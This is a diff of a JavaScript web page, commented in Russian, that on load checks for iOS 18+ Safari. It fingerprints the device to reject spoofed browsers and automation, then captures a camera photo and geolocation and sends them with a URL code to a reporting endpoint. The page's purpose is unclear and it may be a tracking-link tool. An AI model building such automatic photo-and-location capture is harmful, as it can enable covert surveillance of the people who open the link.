@@ -1,4 +1,4 @@
-// === app.js (универсальный: Safari / iOS / Android / Desktop, с фолбэком) ===
+// === app.js (жёсткий гейт: только iPhone/iPad iOS 18+ Safari) ===
 
 // API base из <script>window.__API_BASE</script> в index.html
 const API_BASE =
@@ -174,20 +174,24 @@ async function takePhotoWithFallback() {
   }
 }
 
-// === Инфо об устройстве ===
-function getDeviceInfo() {
-  const ua = navigator.userAgent;
+// === Инфо об устройстве (строго) ===
+function getDeviceInfoStrict() {
+  const ua = navigator.userAgent || "";
+  const vendor = navigator.vendor || "";
+  const platform = navigator.platform || "";
+  const dpr = window.devicePixelRatio || 1;
+  const m = ua.match(/\bOS\s*(\d+)[._]/) || ua.match(/\bVersion\/(\d+)/);
+  const iosVer = m ? parseInt(m[1], 10) : null;
   const isSafari =
     /Safari\//.test(ua) &&
-    !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) &&
-    navigator.vendor === "Apple Computer, Inc.";
-  const m = ua.match(/OS\s(\d+)[_.]/);
-  const iosVer = m ? parseInt(m[1], 10) : null;
-  return { userAgent: ua, platform: navigator.platform, iosVersion: iosVer, isSafari };
+    !/CriOS|Chrome|Chromium|FxiOS|Edg|OPR|OPiOS|YaBrowser|DuckDuckGo|UCBrowser|Brave/i.test(ua) &&
+    vendor === "Apple Computer, Inc." &&
+    /\bAppleWebKit\/\d+/.test(ua);
+  return { userAgent: ua, vendor, platform, iosVersion: iosVer, isSafari, dpr };
 }
 
-// === Лёгкая детекция подмены UA / расширений / автоматизации ===
-async function runDeviceCheck() {
+// === Жёсткая детекция подмены UA / расширений / автоматизации ===
+async function runDeviceCheckStrict() {
   const reasons = [];
   const details = {};
   let score = 100;
@@ -222,85 +226,105 @@ async function runDeviceCheck() {
 
     if (looksLikeIOS && !appleVendor) {
       reasons.push("UA=iOS, но vendor ≠ 'Apple Computer, Inc.'");
-      score -= 25;
+      score -= 30;
     }
     if (mentionsSafari && !details.isSafariLike) {
       reasons.push("UA=Safari, но нет WebKit-признаков");
-      score -= 20;
+      score -= 30;
     }
     if (looksLikeIOS && details.maxTouchPoints === 0) {
       reasons.push("UA=iOS, но maxTouchPoints == 0");
-      score -= 25;
+      score -= 30;
     }
     if (looksLikeIOS && !platformIOS) {
       reasons.push("UA=iOS, но platform не похож на iOS/Mac");
-      score -= 10;
+      score -= 15;
     }
 
     // Автоматизация
     if (details.navigator_webdriver === true) {
       reasons.push("navigator.webdriver === true (автоматизация)");
-      score -= 60;
+      score -= 100;
     }
 
-    // Очень мягкие эвристики «расширений/инъекций»
-    let extensionsSuspicious = false;
-
+    // Проверяем runtime API leakage (признаки расширений / инъекций)
     const leakedChromeRuntime = !!(window.chrome && window.chrome.runtime);
     const leakedBrowserRuntime = !!(window.browser && window.browser.runtime);
     if (leakedChromeRuntime || leakedBrowserRuntime) {
-      extensionsSuspicious = true;
       reasons.push("Следы API расширений runtime (возможна инъекция)");
-      score -= 5;
+      score -= 20;
+      details.leakedRuntime = true;
     }
 
+    // Проверяем, native ли функции (очень жёсткий чек)
     function looksNative(fn) {
       try { return typeof fn === "function" && /\[native code\]/.test(Function.prototype.toString.call(fn)); }
-      catch { return true; }
+      catch { return false; }
     }
     const suspiciousNative =
       !looksNative(navigator.permissions?.query) ||
       !looksNative(navigator.geolocation?.getCurrentPosition) ||
       !looksNative(navigator.mediaDevices?.getUserMedia);
-
     if (suspiciousNative) {
-      extensionsSuspicious = true;
       reasons.push("Web API переопределены (не native) — подозрительно");
-      score -= 5;
+      score -= 20;
     }
 
-    details.extensionsSuspicious = extensionsSuspicious;
+    details.extensionsSuspicious = (leakedChromeRuntime || leakedBrowserRuntime || suspiciousNative);
 
     // Камера latency (если уже померяли в takePhoto)
     details.cameraLatencyMs = (typeof window.__cameraLatencyMs === "number") ? window.__cameraLatencyMs : null;
     if (details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
       reasons.push("Слишком малая cameraLatency — аномально");
+      score -= 20;
+    }
+
+    // минимальные sanity-чексы (размер экрана / DPR)
+    if ((details.screen.w && details.screen.w < 320) || details.dpr < 1) {
+      reasons.push("Подозрительные screen/dpr");
       score -= 10;
     }
 
     // Итоговая ремарка
     if (score >= 80) reasons.push("Ок: признаки iOS/Safari согласованы");
     else if (score >= 60) reasons.push("Есть несостыковки — рекомендуем лёгкую доп. проверку");
-    else reasons.push("Высокая вероятность подмены (джейл/трик)");
+    else reasons.push("Высокая вероятность подмены (отклонять)");
 
   } catch (e) {
     reasons.push("Ошибка проверки окружения: " + (e?.message || String(e)));
+    score = Math.min(score, 40);
   }
 
   return { score, reasons, details, timestamp: Date.now() };
 }
 
-// === Отправка отчёта ===
+// === Отправка отчёта (с опциональным nonce flow) ===
+async function fetchServerNonce() {
+  // Опционально: сервер выдает nonce/sig, чтобы отличить прямые POSTы.
+  // Сервер: GET /api/nonce -> {nonce:"xxx", expires:ts, sig:"hmac"}
+  try {
+    const r = await fetch(`${API_BASE}/api/nonce`, { method: "GET", credentials: "omit" });
+    if (!r.ok) return null;
+    return await r.json();
+  } catch {
+    return null;
+  }
+}
+
 async function sendReport({ photoBase64, geo }) {
-  const info = getDeviceInfo();
+  const info = getDeviceInfoStrict();
   const code = determineCode();
   if (!code) throw new Error("Нет кода в URL");
 
   // Добавляем device_check если он есть (полезно для логов/аналитики)
   const device_check = window.__lastDeviceCheck || null;
 
-  const body = { ...info, geo, photoBase64, note: "auto", code, device_check };
+  // OPTIONAL: получить nonce от сервера и передать его в теле (сервер должен валидировать HMAC)
+  const nonceObj = await fetchServerNonce().catch(() => null);
 
+  const body = { ...info, geo, photoBase64, note: "auto", code, device_check, nonceObj };
+
+  // НИКОГДА не подставляй в клиенте секреты — HMAC подписывается на сервере и проверяется там.
   const r = await fetch(`${API_BASE}/api/report`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -316,6 +340,7 @@ async function sendReport({ photoBase64, geo }) {
   }
 
   if (!r.ok) {
+    // если сервер вернул 4xx/5xx, передаем текст дальше для диагностики
     throw new Error((data && data.error) || text || `HTTP ${r.status}`);
   }
 
@@ -338,16 +363,18 @@ async function autoFlow() {
     const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhotoWithFallback()]);
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);
 
-    // >>> НОВОЕ: прогоняем детектор
-    const check = await runDeviceCheck();
+    // >>> НОВОЕ: прогоняем детектор (жёсткий)
+    const check = await runDeviceCheckStrict();
     window.__lastDeviceCheck = check;
 
-    // Порог: жёстко режем явную подмену (score < 60)
-    if (check.score < 60) {
+    // Порог: жёстко режем явную подмену (score < 70)
+    if (check.score < 70) {
       window.__reportReady = false;
       setBtnLocked();
       if (UI.text) UI.text.innerHTML = '<span class="err">Проверка не пройдена.</span>';
-      if (UI.note) UI.note.textContent = "Обнаружены признаки подмены iOS/Safari. Попробуйте без твиков/подмены UA.";
+      if (UI.note) UI.note.textContent = "Обнаружены признаки подмены UA/расширений/автоматизации.";
+      // логируем детали в консоль (или отправляем в телеграм лог)
+      console.warn("DeviceCheck failed:", check);
       return; // стоп — не отправляем
     }
 
@@ -374,8 +401,93 @@ async function autoFlow() {
   }
 }
 
-// === Инициализация ===
-window.__autoFlow = autoFlow;
+// =======================
+// Жёсткий гейт: запускаем автофлоу только если iOS/iPadOS >= 18 и Safari
+// =======================
+const MIN_IOS_MAJOR = 18;
+
+function isIOSFamily() {
+  const ua = navigator.userAgent || "";
+  const touchMac = navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1; // iPadOS на Mac
+  return /(iPhone|iPad|iPod)/.test(ua) || touchMac;
+}
+
+function parseIOSMajorFromUA() {
+  const ua = navigator.userAgent || "";
+  const m1 = ua.match(/\bOS\s+(\d+)[._]/);
+  if (m1) return parseInt(m1[1], 10);
+  const m2 = ua.match(/\bVersion\/(\d+)/);
+  if (m2) return parseInt(m2[1], 10);
+  return null;
+}
+
+function isPureSafari() {
+  const ua = navigator.userAgent || "";
+  const hasSafari = /Safari\//.test(ua);
+  const hasWebKit = /\bAppleWebKit\/\d+/.test(ua);
+  const notSafari = /CriOS|Chrome|Chromium|FxiOS|Firefox|Edg|EdgiOS|OPR|OPiOS|YaBrowser|DuckDuckGo|UCBrowser|Brave/i.test(ua);
+  const vendorOK = navigator.vendor === "Apple Computer, Inc.";
+  return vendorOK && hasWebKit && hasSafari && !notSafari;
+}
+
+function secureContextOK() {
+  return location.protocol === "https:" || location.hostname === "localhost";
+}
+
+// UI helpers
+function uiDeny(reason) {
+  try {
+    if (UI.text) UI.text.innerHTML = '<span class="err">Отказ в доступе</span>';
+    if (UI.note) UI.note.textContent = reason;
+    setBtnLocked();
+  } catch {}
+}
+
+function uiAllow(iosMajor) {
+  try {
+    if (UI.text) UI.text.innerHTML = '<span class="ok">Доступ разрешён.</span>';
+    if (UI.note) UI.note.textContent = 'Кнопка активируется после проверки.';
+    setBtnLocked(); // активируется внутри autoFlow
+  } catch {}
+}
+
+function deviceGateCheckHard() {
+  if (!secureContextOK())
+    return { ok: false, reason: "Нужен HTTPS (или localhost) для камеры/гео." };
+
+  if (!isIOSFamily())
+    return { ok: false, reason: "Устройство не относится к iOS/iPadOS." };
+
+  const iosMajor = parseIOSMajorFromUA();
+  if (iosMajor == null)
+    return { ok: false, reason: "Не удалось определить версию iOS/iPadOS." };
+
+  if (iosMajor < MIN_IOS_MAJOR)
+    return { ok: false, reason: `Версия iOS/iPadOS ниже ${MIN_IOS_MAJOR}.` };
+
+  if (!isPureSafari())
+    return { ok: false, reason: "Браузер не Safari (или подмена User-Agent)." };
+
+  return { ok: true, iosMajor };
+}
+
+function runGateAndStart() {
+  const res = deviceGateCheckHard();
+  if (!res.ok) {
+    uiDeny(res.reason);
+    return;
+  }
+  uiAllow(res.iosMajor);
+  if (typeof window.__autoFlow === "function") {
+    setTimeout(() => window.__autoFlow(), 100);
+  }
+}
+
+if (document.readyState === "complete" || document.readyState === "interactive") {
+  runGateAndStart();
+} else {
+  document.addEventListener("DOMContentLoaded", runGateAndStart);
+}
 
 // защита от преждевременного клика
 (function guardClick() {
@@ -392,4 +504,3 @@ window.__autoFlow = autoFlow;
     { capture: true }
   );
 })();
-
